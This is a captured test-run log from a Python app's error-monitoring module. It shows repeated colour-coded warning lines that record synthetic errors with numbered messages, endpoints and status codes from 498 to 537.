WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1698'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m34[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1699'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1700'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777833Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1701'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777886Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1702'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777934Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1703'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.777982Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1704'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778029Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1705'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778077Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1706'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778124Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1707'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1708'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1709'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778278Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1710'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778326Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1711'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778374Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1712'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778422Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1713'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778470Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1714'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778518Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1715'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778566Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1716'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1717'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1718'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778791Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1719'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778856Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1720'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778910Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1721'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.778963Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1722'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779015Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1723'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1724'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1725'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1726'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779211Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1727'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779259Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1728'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1729'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1730'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1731'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1732'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779504Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1733'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779552Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1734'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1735'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779649Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1736'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.779699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m35[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1737'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
